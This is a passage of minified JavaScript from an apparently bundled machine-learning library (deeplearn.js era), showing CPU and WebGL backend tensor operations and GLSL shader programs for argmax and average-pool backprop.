v=l[0]*f/h[0],g=l[1]*y/h[1],_=Math.floor(v),b=Math.min(s-1,Math.ceil(v)),w=Math.floor(g),x=Math.min(a-1,Math.ceil(g)),T=t.get(p,_,w,m),S=t.get(p,b,w,m),O=g-w,E=T+(t.get(p,_,x,m)-T)*O,A=E+(S+(t.get(p,b,x,m)-S)*O-E)*(v-_);c.set(A,p,f,y,m)}return c.toTensor()},t.prototype.batchNormalization4D=function(t,e,n,r,i,o){for(var s=t.dataSync(),a=e.dataSync(),u=n.dataSync(),c=i?i.dataSync():new Float32Array([1]),l=o?o.dataSync():new Float32Array([0]),h=new Float32Array(s.length),p=0;p<s.length;p++)h[p]=l[p%l.length]+(s[p]-a[p%a.length])*c[p%c.length]/Math.sqrt(u[p%u.length]+r);return f.tensor4d(h,t.shape)},t.prototype.localResponseNormalization4D=function(t,e,n,r,i,o){for(var s=d.buffer(t.shape,"float32"),a=e,u=s.shape[1]-1,c=s.shape[2]-1,l=s.shape[3]-1,h=function(e,n,r,i){for(var o=0,s=Math.max(0,i-a);s<=Math.min(i+a,l);s++){var u=t.get(e,n,r,s);o+=u*u}return o},p=function(e,n,r,i){for(var o=0,s=Math.max(0,n-a);s<=Math.min(n+a,u);s++)for(var l=Math.max(0,r-a);l<=Math.min(r+a,c);l++)o+=Math.pow(t.get(e,s,l,i),2);return o},f=0;f<s.shape[0];f++)for(var y=0;y<=s.shape[1];y++)for(var m=0;m<s.shape[2];m++)for(var v=0;v<s.shape[3];v++){var g="withinChannel"===o?p(f,y,m,v):h(f,y,m,v),_=t.get(f,y,m,v)*Math.pow(n+r*g,-i);s.set(_,f,y,m,v)}return s.toTensor()},t.prototype.multinomial=function(t,e,n){for(var r=t.shape[0],i=t.shape[1],o=d.zeros([r,e],"int32"),s=o.dataSync(),u=t.dataSync(),c=0;c<r;++c){var l=c*i,h=new Float32Array(i-1);h[0]=u[l];for(var p=1;p<h.length;++p)h[p]=h[p-1]+u[l+p];for(var f=a.alea(n.toString()),y=c*e,m=0;m<e;++m){var v=f();s[y+m]=h.length;for(var g=0;g<h.length;g++)if(v<h[g]){s[y+m]=g;break}}}return o},t.prototype.oneHot=function(t,e,n,r){var i=new Float32Array(t.size*e);i.fill(r);for(var o=0;o<t.size;++o)i[o*e+t.get(o)]=n;return d.tensor2d(i,[t.size,e])},t.prototype.broadcastedBinaryOp=function(t,e,n,r){for(var i=h.assertAndGetBroadcastShape(t.shape,e.shape),o=d.buffer(i,n),s=t.dataSync(),a=e.dataSync(),u=h.getBroadcastDims(t.shape,i),c=h.getBroadcastDims(e.shape,i),l=function(n){var i=o.indexToLoc(n),l=i.slice(-t.rank);u.forEach((function(t){return l[t]=0}));var h=t.locToIndex(l),p=i.slice(-e.rank);c.forEach((function(t){return p[t]=0}));var d=e.locToIndex(p);o.values[n]=r(s[h],a[d])},p=0;p<o.values.length;++p)l(p);return o.toTensor()},t.prototype.dispose=function(){},t}();n.MathBackendCPU=_,u.ENV.registerBackend("cpu",(function(){return new _}));var b=function(t){function e(e){void 0===e&&(e=!1);return console.warn("new NDArrayMathCPU() is deprecated. Please use dl.setBackend('cpu')."),t.call(this,"cpu",e)||this}return i(e,t),e}(c.NDArrayMath);n.NDArrayMathCPU=b},{"../environment":27,"../math":96,"../ops/axis_util":98,"../ops/broadcast_util":101,"../ops/concat_util":104,"../ops/ops":114,"../ops/selu_util":120,"../tensor":137,"../types":142,"../util":143,seedrandom:146}],62:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("../environment"),u=t("../math"),c=t("../ops/axis_util"),l=t("../ops/reduce_util"),h=t("../tensor"),p=t("../types"),d=t("../util"),f=t("./webgl/argminmax_gpu"),y=t("./webgl/avg_pool_backprop_gpu"),m=t("./webgl/batchnorm_gpu"),v=t("./webgl/binaryop_gpu"),g=t("./webgl/binaryop_gpu"),_=t("./webgl/clip_gpu"),b=t("./webgl/concat_gpu"),w=t("./webgl/conv_backprop_gpu"),x=t("./webgl/conv_gpu"),T=t("./webgl/conv_gpu_depthwise"),S=t("./webgl/from_pixels_gpu"),O=t("./webgl/gather_gpu"),E=t("./webgl/gpgpu_context"),A=t("./webgl/gpgpu_math"),k=t("./webgl/logical_gpu"),P=t("./webgl/lrn_gpu"),M=t("./webgl/max_pool_backprop_gpu"),C=t("./webgl/mulmat_gpu"),N=t("./webgl/multinomial_gpu"),R=t("./webgl/onehot_gpu"),F=t("./webgl/pad_gpu"),D=t("./webgl/pool_gpu"),I=t("./webgl/reduce_gpu"),B=t("./webgl/resize_bilinear_gpu"),q=t("./webgl/reverse_gpu"),L=t("./webgl/slice_gpu"),z=t("./webgl/tex_util"),V=t("./webgl/texture_manager"),j=t("./webgl/tile_gpu"),U=t("./webgl/transpose_gpu"),G=t("./webgl/unaryop_gpu"),W=t("./webgl/unaryop_gpu"),X=t("./webgl/webgl_util"),Q=function(){function t(t,e){if(void 0===e&&(e=!0),this.gpgpu=t,this.delayedStorage=e,this.texData=new WeakMap,this.uploadWaitMs=0,this.downloadWaitMs=0,this.binaryCache={},this.disposed=!1,a.ENV.get("WEBGL_VERSION")<1)throw new Error("WebGL is not supported on this device");null==t?(this.gpgpu=new E.GPGPUContext,this.gpgpuCreatedLocally=!0):this.gpgpuCreatedLocally=!1,"undefined"!=typeof document&&(this.canvas=document.createElement("canvas")),this.textureManager=new V.TextureManager(this.gpgpu)}return t.prototype.register=function(t,e,n){if(this.texData.has(t))throw new Error("Data buffer is already registered");this.texData.set(t,{shape:e,dtype:n,values:null,texture:null,texShape:null,texType:z.TextureType.FLOAT})},t.prototype.fromPixels=function(t,e){if(null==t)throw new Error("MathBackendWebGL.writePixels(): pixels can not be null");var n=[t.height,t.width],r=[t.height,t.width,e];if(t instanceof HTMLVideoElement){if(null==this.canvas)throw new Error("Can't read pixels from HTMLImageElement outside the browser.");this.canvas.width=t.width,this.canvas.height=t.height,this.canvas.getContext("2d").drawImage(t,0,0,t.width,t.height),t=this.canvas}var i=h.Tensor.make(n,{},"int32");this.texData.get(i.dataId).texType=z.TextureType.UNSIGNED_BYTE,this.gpgpu.uploadPixelDataToTexture(this.getTexture(i.dataId),t);var o=new S.FromPixelsProgram(r),s=this.compileAndRun(o,[i]);return i.dispose(),s},t.prototype.write=function(t,e){if(null==e)throw new Error("MathBackendWebGL.write(): values can not be null");this.throwIfNoData(t);var n=this.texData.get(t),r=n.texture,i=n.texShape,o=n.texType;null!=r&&(this.textureManager.releaseTexture(r,i,o),n.texture=null,n.texShape=null),n.values=e,this.delayedStorage||this.uploadToGPU(t)},t.prototype.readSync=function(t){this.throwIfNoData(t);var e=this.texData.get(t),n=e.texture,r=e.values,i=e.texShape;if(null!=r)return this.cacheOnCPU(t),r;var o,s=null!=this.activeTimers;s&&(o=performance.now());var a=this.gpgpu.downloadMatrixFromTexture(n,i[0],i[1]);return s&&(this.downloadWaitMs+=performance.now()-o),this.cacheOnCPU(t,a),e.values},t.prototype.read=function(t){return o(this,void 0,void 0,(function(){var e,n,r,i,o;return s(this,(function(s){switch(s.label){case 0:return this.throwIfNoData(t),e=this.texData.get(t),n=e.texture,r=e.values,i=e.texShape,null!=r?(this.cacheOnCPU(t),[2,r]):a.ENV.get("WEBGL_GET_BUFFER_SUB_DATA_ASYNC_EXTENSION_ENABLED")?[4,this.gpgpu.downloadMatrixFromTextureAsync(n,i[0],i[1])]:[3,2];case 1:return o=s.sent(),this.cacheOnCPU(t,o),[2,e.values];case 2:return 0===a.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")?[2,this.readSync(t)]:[4,this.gpgpu.runQuery((function(){}))];case 3:return s.sent(),[2,this.readSync(t)]}}))}))},t.prototype.time=function(t){return o(this,void 0,void 0,(function(){var e,n,r,i,o,a;return s(this,(function(s){switch(s.label){case 0:return e=this.activeTimers,n=[],r=!1,null==this.programTimersStack?(this.programTimersStack=n,r=!0):this.activeTimers.push(n),this.activeTimers=n,t(),i=d.flatten(this.activeTimers),this.activeTimers=e,r&&(this.programTimersStack=null),[4,Promise.all(i).then((function(t){var e=0;return t.forEach((function(t){return e+=t})),e}))];case 1:return o=s.sent(),a={uploadWaitMs:this.uploadWaitMs,downloadWaitMs:this.downloadWaitMs,kernelMs:o,wallMs:null},this.uploadWaitMs=0,this.downloadWaitMs=0,[2,a]}}))}))},t.prototype.memory=function(){return{unreliable:!1}},t.prototype.startTimer=function(){return a.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")>0?this.gpgpu.beginQuery():{startMs:performance.now(),endMs:null}},t.prototype.endTimer=function(t){return a.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")>0?(this.gpgpu.endQuery(),t):(t.endMs=performance.now(),t)},t.prototype.getQueryTime=function(t){return o(this,void 0,void 0,(function(){var e;return s(this,(function(n){return a.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")>0?[2,this.gpgpu.pollQueryTime(t)]:[2,(e=t).endMs-e.startMs]}))}))},t.prototype.disposeData=function(t){if(this.texData.has(t)){var e=this.texData.get(t),n=e.texture,r=e.texShape,i=e.texType;null!=n&&this.textureManager.releaseTexture(n,r,i),this.texData.delete(t)}},t.prototype.getTexture=function(t){return this.uploadToGPU(t),this.texData.get(t).texture},t.prototype.getTextureData=function(t){return this.uploadToGPU(t),this.texData.get(t)},t.prototype.getGPGPUContext=function(){return this.gpgpu},t.prototype.slice=function(t,e,n){var r=new L.SliceProgram(n),i=r.getCustomSetupFunc(e);return this.compileAndRun(r,[t],null,i)},t.prototype.reverse=function(t,e){var n=new q.ReverseProgram(t.shape,e);return this.compileAndRun(n,[t])},t.prototype.concat=function(t,e){var n=new b.ConcatProgram(t.shape,e.shape);return this.compileAndRun(n,[t,e])},t.prototype.neg=function(t){var e=new W.UnaryOpProgram(t.shape,G.NEG);return this.compileAndRun(e,[t])},t.prototype.matMul=function(t,e,n,r){var i=new C.MatMulProgram(t.shape,e.shape,n,r);return this.compileAndRun(i,[t,e])},t.prototype.multiply=function(t,e){var n=new g.BinaryOpProgram(v.MUL,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,p.upcastType(t.dtype,e.dtype));return this.compileAndRun(n,[t,e],r)},t.prototype.batchNormalization4D=function(t,e,n,r,i,o){var s=[t,e,n],a=null;null!=o&&(a=o.shape,s.push(o));var u=null;null!=i&&(u=i.shape,s.push(i));var c=new m.BatchNormProgram(t.shape,e.shape,n.shape,a,u,r);return this.compileAndRun(c,s)},t.prototype.localResponseNormalization4D=function(t,e,n,r,i,o){var s=new P.LRNProgram(t.shape,e,n,r,i,o);return this.compileAndRun(s,[t])},t.prototype.tile=function(t,e){var n=new j.TileProgram(t.shape,e);return this.compileAndRun(n,[t])},t.prototype.pad=function(t,e,n){var r=new F.PadProgram(t.shape,e,n);return this.compileAndRun(r,[t])},t.prototype.transpose=function(t,e){var n=new U.TransposeProgram(t.shape,e);return this.compileAndRun(n,[t])},t.prototype.gather=function(t,e,n){var r=new O.GatherProgram(t.shape,e.size,n);return this.compileAndRun(r,[t,e])},t.prototype.reduce=function(t,e,n){var r=t.shape[0],i=t.shape[1],o={windowSize:l.computeOptimalWindowSize(i),inSize:i,batchSize:r},s=new I.ReduceProgram(o,e),a=s.outputShape,u=a[0],c=a[1],h=this.makeOutputArray([u,c],n);return this.compileAndRun(s,[t],h),1===h.shape[1]?h:this.reduce(h,e,n)},t.prototype.argReduce=function(t,e,n){void 0===n&&(n=null);var r=t.shape[0],i=t.shape[1];null!=n&&(r=n.shape[0],i=n.shape[1]);var o={windowSize:l.computeOptimalWindowSize(i),inSize:i,batchSize:r},s=new f.ArgMinMaxProgram(o,e,null==n),a=s.outputShape,u=a[0],c=a[1],h=this.makeOutputArray([u,c],"int32"),p=[t];return null!=n&&p.push(n),this.compileAndRun(s,p,h),1===h.shape[1]?h:this.argReduce(t,e,h)},t.prototype.sum=function(t,e){c.assertAxesAreInnerMostDims("sum",e,t.rank);var n=c.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.sizeFromShape(i),s=t.as2D(-1,o),a=p.sumOutType(t.dtype);return this.reduce(s,"sum",a).reshape(r)},t.prototype.argMin=function(t,e){c.assertAxesAreInnerMostDims("argMin",e,t.rank);var n=c.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.sizeFromShape(i),s=t.as2D(-1,o);return this.argReduce(s,"min").reshape(r)},t.prototype.argMax=function(t,e){c.assertAxesAreInnerMostDims("argMax",e,t.rank);var n=c.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.sizeFromShape(i),s=t.as2D(-1,o);return this.argReduce(s,"max").reshape(r)},t.prototype.equal=function(t,e){var n=new g.BinaryOpProgram(v.EQUAL,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.notEqual=function(t,e){var n=new g.BinaryOpProgram(v.NOT_EQUAL,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.less=function(t,e){var n=new g.BinaryOpProgram(v.LESS,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.lessEqual=function(t,e){var n=new g.BinaryOpProgram(v.LESS_EQUAL,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.greater=function(t,e){var n=new g.BinaryOpProgram(v.GREATER,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.greaterEqual=function(t,e){var n=new g.BinaryOpProgram(v.GREATER_EQUAL,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.logicalNot=function(t){var e=new W.UnaryOpProgram(t.shape,G.LOGICAL_NOT);return this.compileAndRun(e,[t])},t.prototype.logicalAnd=function(t,e){var n=new g.BinaryOpProgram(v.LOGICAL_AND,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.logicalOr=function(t,e){var n=new g.BinaryOpProgram(v.LOGICAL_OR,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.logicalXor=function(t,e){var n=new g.BinaryOpProgram(v.LOGICAL_XOR,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"bool");return this.compileAndRun(n,[t,e],r)},t.prototype.where=function(t,e,n,r){var i=new k.WhereProgram(t.rank,e.shape,e.rank),o=this.makeOutputArray(i.outputShape,r);return this.compileAndRun(i,[t,e,n],o)},t.prototype.topKValues=function(t,e){throw new Error("topKValues GPU not yet implemented!")},t.prototype.topKIndices=function(t,e){throw new Error("topKIndices GPU not yet implemented!")},t.prototype.min=function(t,e){c.assertAxesAreInnerMostDims("min",e,t.rank);var n=c.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.sizeFromShape(i),s=t.as2D(-1,o);return this.reduce(s,"min",s.dtype).reshape(r)},t.prototype.minimum=function(t,e){var n=new g.BinaryOpProgram(v.MIN,t.shape,e.shape);return this.compileAndRun(n,[t,e])},t.prototype.max=function(t,e){c.assertAxesAreInnerMostDims("max",e,t.rank);var n=c.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.sizeFromShape(i),s=t.as2D(-1,o);return this.reduce(s,"max",s.dtype).reshape(r)},t.prototype.maximum=function(t,e){var n=new g.BinaryOpProgram(v.MAX,t.shape,e.shape);return this.compileAndRun(n,[t,e])},t.prototype.divide=function(t,e){var n=new g.BinaryOpProgram(v.DIV,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,"float32");return this.compileAndRun(n,[t,e],r)},t.prototype.add=function(t,e){var n=new g.BinaryOpProgram(v.ADD,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,p.upcastType(t.dtype,e.dtype));return this.compileAndRun(n,[t,e],r)},t.prototype.subtract=function(t,e){var n=new g.BinaryOpProgram(v.SUB,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,p.upcastType(t.dtype,e.dtype));return this.compileAndRun(n,[t,e],r)},t.prototype.pow=function(t,e){var n=new g.BinaryOpProgram(v.POW,t.shape,e.shape),r=this.makeOutputArray(n.outputShape,p.upcastType(t.dtype,e.dtype));return this.compileAndRun(n,[t,e],r)},t.prototype.ceil=function(t){var e=new W.UnaryOpProgram(t.shape,G.CEIL);return this.compileAndRun(e,[t])},t.prototype.floor=function(t){var e=new W.UnaryOpProgram(t.shape,G.FLOOR);return this.compileAndRun(e,[t])},t.prototype.exp=function(t){var e=new W.UnaryOpProgram(t.shape,G.EXP);return this.compileAndRun(e,[t])},t.prototype.log=function(t){var e=new W.UnaryOpProgram(t.shape,G.LOG);return this.compileAndRun(e,[t])},t.prototype.sqrt=function(t){var e=new W.UnaryOpProgram(t.shape,G.SQRT);return this.compileAndRun(e,[t])},t.prototype.square=function(t){var e=new W.UnaryOpProgram(t.shape,G.SQUARE);return this.compileAndRun(e,[t])},t.prototype.relu=function(t){var e=new W.UnaryOpProgram(t.shape,G.RELU);return this.compileAndRun(e,[t])},t.prototype.elu=function(t){var e=new W.UnaryOpProgram(t.shape,G.ELU);return this.compileAndRun(e,[t])},t.prototype.eluDer=function(t){var e=new W.UnaryOpProgram(t.shape,G.ELU_DER);return this.compileAndRun(e,[t])},t.prototype.selu=function(t){var e=new W.UnaryOpProgram(t.shape,G.SELU);return this.compileAndRun(e,[t])},t.prototype.leakyRelu=function(t,e){var n=new W.UnaryOpProgram(t.shape,G.LEAKY_RELU(e));return this.compileAndRun(n,[t])},t.prototype.prelu=function(t,e){var n=new g.BinaryOpProgram(v.PRELU,t.shape,e.shape);return this.compileAndRun(n,[t,e])},t.prototype.preluDer=function(t,e){var n=new g.BinaryOpProgram(v.PRELU_DER,t.shape,e.shape);return this.compileAndRun(n,[t,e])},t.prototype.int=function(t){var e=new W.UnaryOpProgram(t.shape,G.TO_INT),n=this.makeOutputArray(e.outputShape,"int32");return this.compileAndRun(e,[t],n)},t.prototype.clip=function(t,e,n){var r=new _.ClipProgram(t.shape,e,n);return this.compileAndRun(r,[t])},t.prototype.abs=function(t){var e=new W.UnaryOpProgram(t.shape,G.ABS);return this.compileAndRun(e,[t])},t.prototype.sigmoid=function(t){var e=new W.UnaryOpProgram(t.shape,G.SIGMOID);return this.compileAndRun(e,[t])},t.prototype.sin=function(t){var e=new W.UnaryOpProgram(t.shape,G.SIN);return this.compileAndRun(e,[t])},t.prototype.cos=function(t){var e=new W.UnaryOpProgram(t.shape,G.COS);return this.compileAndRun(e,[t])},t.prototype.tan=function(t){var e=new W.UnaryOpProgram(t.shape,G.TAN);return this.compileAndRun(e,[t])},t.prototype.asin=function(t){var e=new W.UnaryOpProgram(t.shape,G.ASIN);return this.compileAndRun(e,[t])},t.prototype.acos=function(t){var e=new W.UnaryOpProgram(t.shape,G.ACOS);return this.compileAndRun(e,[t])},t.prototype.atan=function(t){var e=new W.UnaryOpProgram(t.shape,G.ATAN);return this.compileAndRun(e,[t])},t.prototype.sinh=function(t){var e=new W.UnaryOpProgram(t.shape,G.SINH);return this.compileAndRun(e,[t])},t.prototype.cosh=function(t){var e=new W.UnaryOpProgram(t.shape,G.COSH);return this.compileAndRun(e,[t])},t.prototype.tanh=function(t){var e=new W.UnaryOpProgram(t.shape,G.TANH);return this.compileAndRun(e,[t])},t.prototype.step=function(t,e){var n=new W.UnaryOpProgram(t.shape,G.STEP(e));return this.compileAndRun(n,[t])},t.prototype.conv2d=function(t,e,n){var r=new x.Conv2DProgram(n);return this.compileAndRun(r,[t,e])},t.prototype.conv2dDerInput=function(t,e,n){var r=new w.Conv2DDerInputProgram(n);return this.compileAndRun(r,[t,e])},t.prototype.conv2dDerFilter=function(t,e,n){var r=new w.Conv2DDerFilterProgram(n);return this.compileAndRun(r,[t,e])},t.prototype.depthwiseConv2D=function(t,e,n){var r=new T.DepthwiseConv2DProgram(n);return this.compileAndRun(r,[t,e])},t.prototype.maxPool=function(t,e){var n=new D.Pool2DProgram(e,"max",!1),r=this.makeOutputArray(n.outputShape,t.dtype);return this.compileAndRun(n,[t],r)},t.prototype.minPool=function(t,e){var n=new D.Pool2DProgram(e,"min",!1),r=this.makeOutputArray(n.outputShape,t.dtype);return this.compileAndRun(n,[t],r)},t.prototype.avgPool=function(t,e){var n=new D.Pool2DProgram(e,"avg",!1),r=this.makeOutputArray(n.outputShape,"float32");return this.compileAndRun(n,[t],r)},t.prototype.maxPoolBackprop=function(t,e,n){var r=new D.Pool2DProgram(n,"max",!0),i=this.compileAndRun(r,[e]),o=new M.MaxPool2DBackpropProgram(n),s=this.makeOutputArray(o.outputShape,e.dtype),a=this.compileAndRun(o,[t,i],s);return i.dispose(),a},t.prototype.avgPoolBackprop=function(t,e,n){var r=new y.AvgPool2DBackpropProgram(n),i=this.makeOutputArray(r.outputShape,e.dtype);return this.compileAndRun(r,[t],i)},t.prototype.resizeBilinear=function(t,e,n,r){var i=new B.ResizeBilinearProgram(t.shape,e,n,r);return this.compileAndRun(i,[t])},t.prototype.multinomial=function(t,e,n){var r=t.shape[0],i=t.shape[1],o=new N.MultinomialProgram(r,i,e),s=this.makeOutputArray(o.outputShape,"int32"),a=o.getCustomSetupFunc(n);return this.compileAndRun(o,[t],s,a)},t.prototype.oneHot=function(t,e,n,r){var i=new R.OneHotProgram(t.size,e,n,r);return this.compileAndRun(i,[t])},t.prototype.makeOutputArray=function(t,e){return h.Tensor.make(t,{},e)},t.prototype.compileAndRun=function(t,e,n,r){var i=this;null==n&&(n=this.makeOutputArray(t.outputShape,e[0].dtype));var o=e.map((function(t){return i.uploadToGPU(t.dataId),{tensor:t,texData:i.texData.get(t.dataId)}}));this.uploadToGPU(n.dataId);var s,a={tensor:n,texData:this.texData.get(n.dataId)},u=A.makeShaderKey(t,o,a),c=this.getAndSaveBinary(u,(function(){return A.compileProgram(i.gpgpu,t,o,a)})),l=null!=this.activeTimers;return l&&(s=this.startTimer()),A.runProgram(c,o,a,r),l&&(s=this.endTimer(s),this.activeTimers.push(this.getQueryTime(s))),n},t.prototype.getAndSaveBinary=function(t,e){return t in this.binaryCache||(this.binaryCache[t]=e()),this.binaryCache[t]},t.prototype.getTextureManager=function(){return this.textureManager},t.prototype.dispose=function(){if(!this.disposed){for(var t in this.binaryCache)this.gpgpu.deleteProgram(this.binaryCache[t].webGLProgram);this.textureManager.dispose(),this.canvas.remove(),this.gpgpuCreatedLocally&&this.gpgpu.dispose(),this.disposed=!0}},t.prototype.throwIfNoData=function(t){if(!this.texData.has(t))throw new Error("WebGL backend: No data found for this tensor. Did you change your backend in the middle of the program? New backends can't use Tensors created with previous backends")},t.prototype.uploadToGPU=function(t){this.throwIfNoData(t);var e=this.texData.get(t),n=e.shape,r=e.values,i=e.texture,o=e.dtype,s=e.texType;if(null==i){var a,u=null!=this.activeTimers;u&&(a=performance.now());var c=X.getTextureShapeFromLogicalShape(this.gpgpu.gl,n);e.texShape=c;var l=this.textureManager.acquireTexture(c,s);e.texture=l,null!=r&&(this.gpgpu.uploadMatrixToTexture(l,c[0],c[1],function(t,e){if(t instanceof Float32Array)return t;for(var n=new Float32Array(t.length),r=0;r<n.length;r++){var i=t[r];n[r]=d.isValNaN(i,e)?NaN:i}return n}(r,o)),e.values=null,u&&(this.uploadWaitMs+=performance.now()-a))}},t.prototype.cacheOnCPU=function(t,e){var n=this.delayedStorage,r=this.texData.get(t),i=r.texture,o=r.texShape,s=r.dtype,a=r.texType;n&&null!=i&&(this.textureManager.releaseTexture(i,o,a),r.texture=null,r.texShape=null),null!=e&&(r.values=function(t,e){if("float32"===e)return t;if("int32"===e||"bool"===e){for(var n="int32"===e?new Int32Array(t.length):new Uint8Array(t.length),r=0;r<n.length;++r){var i=t[r];i=isNaN(i)?d.getNaN(e):Math.round(i),n[r]=i}return n}throw new Error("Unknown dtype "+e)}(e,s))},t}();n.MathBackendWebGL=Q,a.ENV.registerBackend("webgl",(function(){return new Q}));var H=function(t){function e(e,n){void 0===n&&(n=!1);return console.warn("new NDArrayMathGPU() is deprecated. Please use dl.setBackend('webgl')."),t.call(this,new Q(e),n)||this}return i(e,t),e}(u.NDArrayMath);n.NDArrayMathGPU=H},{"../environment":27,"../math":96,"../ops/axis_util":98,"../ops/reduce_util":117,"../tensor":137,"../types":142,"../util":143,"./webgl/argminmax_gpu":63,"./webgl/avg_pool_backprop_gpu":64,"./webgl/batchnorm_gpu":65,"./webgl/binaryop_gpu":66,"./webgl/clip_gpu":67,"./webgl/concat_gpu":68,"./webgl/conv_backprop_gpu":69,"./webgl/conv_gpu":70,"./webgl/conv_gpu_depthwise":71,"./webgl/from_pixels_gpu":72,"./webgl/gather_gpu":73,"./webgl/gpgpu_context":74,"./webgl/gpgpu_math":75,"./webgl/logical_gpu":77,"./webgl/lrn_gpu":78,"./webgl/max_pool_backprop_gpu":79,"./webgl/mulmat_gpu":80,"./webgl/multinomial_gpu":81,"./webgl/onehot_gpu":82,"./webgl/pad_gpu":83,"./webgl/pool_gpu":84,"./webgl/reduce_gpu":85,"./webgl/resize_bilinear_gpu":86,"./webgl/reverse_gpu":87,"./webgl/slice_gpu":89,"./webgl/tex_util":90,"./webgl/texture_manager":91,"./webgl/tile_gpu":92,"./webgl/transpose_gpu":93,"./webgl/unaryop_gpu":94,"./webgl/webgl_util":95}],63:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n){this.variableNames=["A"];var r=t.windowSize,i=t.batchSize,o=t.inSize,s=Math.ceil(o/r);n||this.variableNames.push("bestIndicesA"),this.outputShape=[i,s];var a="max"===e?">":"<",u=n?"inOffset + i;":"round(getBestIndicesA(batch, inOffset + i));";this.userCode="\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n        int outIdx = coords[1];\n        int inOffset = outIdx * "+r+";\n\n        int bestIndex = 0;\n        float bestValue = getA(batch, inOffset);\n\n        for (int i = 0; i < "+r+"; i++) {\n          int inIdx = "+u+";\n          float candidate = getA(batch, inIdx);\n          if (isNaN(candidate)) {\n            setOutput(candidate);\n            return;\n          }\n          if (candidate "+a+" bestValue) {\n            bestValue = candidate;\n            bestIndex = inIdx;\n          }\n        }\n        setOutput(float(bestIndex));\n      }\n    "};n.ArgMinMaxProgram=r},{}],64:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t){this.variableNames=["dy"],this.outputShape=t.inShape;var e=t.filterHeight,n=t.filterWidth,r=t.strideHeight,i=t.strideWidth,o=e-1-t.padInfo.top,s=n-1-t.padInfo.left,a=1/(e*n);this.userCode="\n      const ivec2 pads = ivec2("+o+", "+s+");\n      const float avgMultiplier = float("+a+");\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n\n        ivec2 dyRCCorner = coords.yz - pads;\n        int dyRCorner = dyRCCorner.x;\n        int dyCCorner = dyRCCorner.y;\n\n        // Convolve dy(?, ?, d) with pos mask(:, :, d) to get dx(xR, xC, d).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < "+e+"; wR++) {\n          float dyR = float(dyRCorner + wR) / "+r+".0;\n\n          if (dyR < 0.0 || dyR >= "+t.outHeight+".0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          for (int wC = 0; wC < "+n+"; wC++) {\n            float dyC = float(dyCCorner + wC) / "+i+".0;\n\n            if (dyC < 0.0 || dyC >= "+t.outWidth+".0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            float dyValue = getDy(b, idyR, idyC, d);\n\n            dotProd += dyValue * 